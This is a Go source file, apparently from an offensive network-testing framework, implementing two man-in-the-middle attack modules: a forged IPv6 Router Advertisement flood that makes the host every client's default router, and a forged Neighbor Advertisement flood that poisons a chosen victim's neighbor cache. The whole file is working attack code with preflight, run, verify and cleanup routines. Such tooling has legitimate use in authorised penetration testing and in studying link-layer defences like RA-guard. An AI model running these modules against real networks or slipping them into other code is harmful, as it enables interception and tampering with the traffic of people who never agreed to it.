package mitm

import (
	"fmt"
	"net"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/netx/ndp"
	"github.com/qyvora/toha3ee/internal/safety"
)

func init() {
	attacks.Register(&IPv6RouterAdv{})
	attacks.Register(&IPv6NeighborAdv{})
}

// IPv6RouterAdv floods the link with forged Router Advertisements making this
// host the default IPv6 router. Every IPv6 client then routes its traffic
// through the attacker.
type IPv6RouterAdv struct{}

// Meta implements attacks.Module.
func (*IPv6RouterAdv) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "ipv6.ra",
		Category:    "mitm",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"gateway", "host"},
		Requires:    []string{"cap.ipv6", "cap.raw_socket"},
		Description: "IPv6 router advertisement flood: become the default router on the link to capture IPv6 traffic",
		Limitations: "only affects IPv6 clients; RA-guard on the switch port and source-address-filtering drop these frames",
	}
}

// Preflight checks for root, an interface and IPv6 support on the link.
func (*IPv6RouterAdv) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())
	if ctx.Iface.IPv6 == nil {
		rep.AddFixable("ipv6", "interface has no IPv6 address; RA will still advertise this MAC as a router")
	} else {
		rep.AddOK("ipv6", ctx.Iface.IPv6.String())
	}
	return rep, nil
}

// Run floods Router Advertisements every few seconds until stopped.
func (*IPv6RouterAdv) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	s, err := ndp.NewSender(ctx.Iface.Name)
	if err != nil {
		return fmt.Errorf("ipv6.ra: %w", err)
	}
	ctx.SetState("ipv6.ra", s)
	ctx.Safety.RegisterCleanup("ipv6.ra", "stop RA flood", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("ipv6.ra", hb)

	ctx.Printf("[*] ipv6.ra flooding Router Advertisements on %s...\n", ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		n, err := s.RouterAdvertisement(ctx.Iface.IPv6, ctx.Iface.MAC, 10)
		if err != nil {
			ctx.Printf("[!] ipv6.ra: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		hb.Beat()
		ctx.Printf("[ipv6.ra] sent %d Router Advertisements (total %d)\n", n, s.Sent)
		time.Sleep(2 * time.Second)
	}
}

// Verify reports how many forged Router Advertisements were sent.
func (*IPv6RouterAdv) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("ipv6.ra")
	if !ok {
		return &attacks.Impact{Summary: "RA flood was active"}, nil
	}
	s := v.(*ndp.Sender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d forged Router Advertisements", s.Sent)}
	imp.Add("ra_sent", fmt.Sprintf("%d", s.Sent))
	return imp, nil
}

// Cleanup stops the RA flood and closes the NDP sender socket.
func (*IPv6RouterAdv) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("ipv6.ra")
	ctx.Safety.UnregisterCleanup("ipv6.ra")
	if v, ok := ctx.GetState("ipv6.ra"); ok {
		v.(*ndp.Sender).Close()
	}
	return nil
}

// IPv6NeighborAdv floods forged Neighbor Advertisements so every host caches
// the victim's IP as belonging to this host (the IPv6 twin of ARP poisoning).
type IPv6NeighborAdv struct{}

// Meta implements attacks.Module.
func (*IPv6NeighborAdv) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "ipv6.ndp",
		Category:    "mitm",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"host"},
		Requires:    []string{"cap.ipv6", "cap.raw_socket"},
		Description: "IPv6 neighbor advertisement flood: poison neighbor caches so the victim's traffic flows to this host",
		Limitations: "secrets in IPv6 neighbor-cache entries are evicted when the real victim responds (a race); RA-guard/NDP trust rules may drop the frames",
	}
}

// Preflight checks for root, an interface and a configured victim address.
func (*IPv6NeighborAdv) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())
	if ctx.Iface.IPv6 == nil {
		rep.AddBlocked("ipv6", "interface has no IPv6 source address")
	}
	rep.AddFixable("target", "set ipv6.ndp.victim to the victim's IPv6 address")
	return rep, nil
}

// Run poisons the victim's neighbor cache with forged Neighbor Advertisements
// until stopped.
func (*IPv6NeighborAdv) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	if ctx.Iface.IPv6 == nil {
		return fmt.Errorf("ipv6.ndp: no IPv6 address on %s", ctx.Iface.Name)
	}
	victimStr := ctx.Conf.GetDefault("ipv6.ndp", "victim", "")
	if victimStr == "" {
		return fmt.Errorf("ipv6.ndp: set ipv6.ndp.victim to the target IPv6 address")
	}
	victim := net.ParseIP(victimStr)
	if victim == nil {
		return fmt.Errorf("ipv6.ndp: bad victim address %q", victimStr)
	}

	s, err := ndp.NewSender(ctx.Iface.Name)
	if err != nil {
		return fmt.Errorf("ipv6.ndp: %w", err)
	}
	ctx.SetState("ipv6.ndp", s)
	ctx.Safety.RegisterCleanup("ipv6.ndp", "stop NA flood", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("ipv6.ndp", hb)

	ctx.Printf("[*] ipv6.ndp poisoning %s -> %s on %s\n", victim, ctx.Iface.MAC, ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		n, err := s.NeighborAdvertisement(ctx.Iface.IPv6, ctx.Iface.MAC, victim, 5)
		if err != nil {
			ctx.Printf("[!] ipv6.ndp: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		hb.Beat()
		ctx.Printf("[ipv6.ndp] claimed %s %d times (total %d)\n", victim, n, s.Sent)
		time.Sleep(500 * time.Millisecond)
	}
}

// Verify reports how many forged Neighbor Advertisements were sent.
func (*IPv6NeighborAdv) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("ipv6.ndp")
	if !ok {
		return &attacks.Impact{Summary: "NDP poisoning was active"}, nil
	}
	s := v.(*ndp.Sender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d forged Neighbor Advertisements", s.Sent)}
	imp.Add("na_sent", fmt.Sprintf("%d", s.Sent))
	return imp, nil
}

// Cleanup stops the NA flood and closes the NDP sender socket.
func (*IPv6NeighborAdv) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("ipv6.ndp")
	ctx.Safety.UnregisterCleanup("ipv6.ndp")
	if v, ok := ctx.GetState("ipv6.ndp"); ok {
		v.(*ndp.Sender).Close()
	}
	return nil
}

var _ attacks.Module = (*IPv6RouterAdv)(nil)
var _ attacks.Module = (*IPv6NeighborAdv)(nil)
